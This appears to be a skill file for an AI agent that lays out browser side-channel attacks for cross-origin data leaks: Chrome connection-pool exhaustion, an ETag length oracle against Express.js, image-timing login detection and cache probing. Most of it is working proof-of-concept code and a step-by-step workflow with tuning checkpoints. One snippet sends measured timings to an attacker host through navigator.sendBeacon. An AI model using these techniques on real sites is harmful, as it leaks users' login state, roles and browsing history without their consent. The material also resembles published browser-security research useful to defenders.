---
name: browser-side-channel
description: Browser-based side channel attacks for cross-origin data leaks via connection pool exhaustion, ETag oracles, and timing differentials. Use when direct XSS fails but cross-origin information leakage is needed.
---

# Browser Side Channel Attacks

## Pattern
- Cross-origin data leakage without XSS
- Need to detect state (logged in, admin, specific content) on another origin
- Target has detectable behavioral differences based on auth state or content

## Techniques

### XSS-Leak via Connection Pool Exhaustion (Chrome)

1. **Saturate** Chrome's 256-connection pool (open 255 persistent connections)
2. **Trigger** a cross-origin navigation that may redirect based on state
3. **Measure** which host resolves next -- DNS timing differs under pool exhaustion
4. **Binary search** the leaked hostname character by character

```javascript
// Saturate pool with 255 WebSocket connections to different hosts
for (let i = 0; i < 255; i++) {
  new WebSocket(`wss://pad-${i}.attacker.com/hold`);
}
// Trigger cross-origin fetch -- redirect destination leaks via timing
const start = performance.now();
fetch('https://target.com/auth-redirect', {mode: 'no-cors'}).then(() => {
  const elapsed = performance.now() - start;
  // admin.target.com vs login.target.com have different DNS timing under pool exhaustion
  navigator.sendBeacon('https://attacker.com/log', `elapsed=${elapsed}`);
});
```

**Checkpoint:** If timing variance between states is <5ms, increase sample count to 50+ and average. If WebSocket connections drop, server may be closing idle sockets -- send keepalive pings via `setInterval`.

### Cross-Site ETag Length Oracle (Express.js)

1. **Observe**: Express auto-generates ETag headers for responses
2. **Trigger**: Browser caches ETag, sends it back as `If-None-Match`
3. **Overflow**: Pad the request to approach 16KB header limit
4. **Differentiate**: Long ETag (large response) -> 431 error. Short -> 304 Not Modified.

```http
GET /api/user/profile HTTP/1.1
If-None-Match: "cached-etag-value"
X-Pad: AAAA...AAAA  (pad to ~16KB minus ETag length threshold)
```
- 431 = ETag + padding exceeded 16KB -> response was large (user exists, has data)
- 304 = ETag matched, response was small -> different state

**Checkpoint:** Send without padding first to confirm normal 200/304 behavior. Then binary search padding length: if 431 at N bytes but not N-100, ETag is between (16384-N) and (16384-N+100) bytes.

### Timing-Based State Detection

```html
<script>
async function detectLoginState(targetUrl, samples = 30) {
  const times = [];
  for (let i = 0; i < samples; i++) {
    const start = performance.now();
    await new Promise(resolve => {
      const img = new Image();
      img.onload = img.onerror = resolve;
      img.src = targetUrl + '?cachebust=' + Math.random();
    });
    times.push(performance.now() - start);
  }
  const mean = times.reduce((a, b) => a + b) / times.length;
  const stddev = Math.sqrt(times.reduce((s, t) => s + (t - mean) ** 2, 0) / times.length);
  return { mean: mean.toFixed(1), stddev: stddev.toFixed(1), samples: times.length };
}

// Logged-in: ~200ms+ (full page). Logged-out: ~50ms (302 redirect).
detectLoginState('https://target.com/dashboard-asset').then(r =>
  console.log(`Mean: ${r.mean}ms, StdDev: ${r.stddev}ms`)
);
</script>
```

**Checkpoint:** Run against a known-state endpoint first to establish baseline. If stddev >30% of mean, network jitter is too high -- increase sample count or use HTTP/2 multiplexing.

### Cache Probing
Cached resource loads in ~1-2ms vs network fetch at 50ms+. Reveals browsing history for same-site resources.

**Checkpoint:** Clear cache and re-measure to confirm delta is reproducible. Modern browsers partition cache by top-level site -- this only works for same-site resources.

## Workflow

1. Map target redirects that differ based on auth/role state
2. Identify response size differences between states (admin vs user vs anon)
3. Check if Express.js (ETag auto-generation) or similar framework in use
4. Select technique based on available signal:
   - Size difference -> ETag oracle
   - Redirect difference -> connection pool exhaustion
   - Timing difference -> timing-based detection
5. Run PoC with >=30 samples, calculate mean/stddev
6. If stddev > mean/3 -> increase samples or try different technique
7. Confirm cross-origin: PoC must work from attacker origin, not same-origin
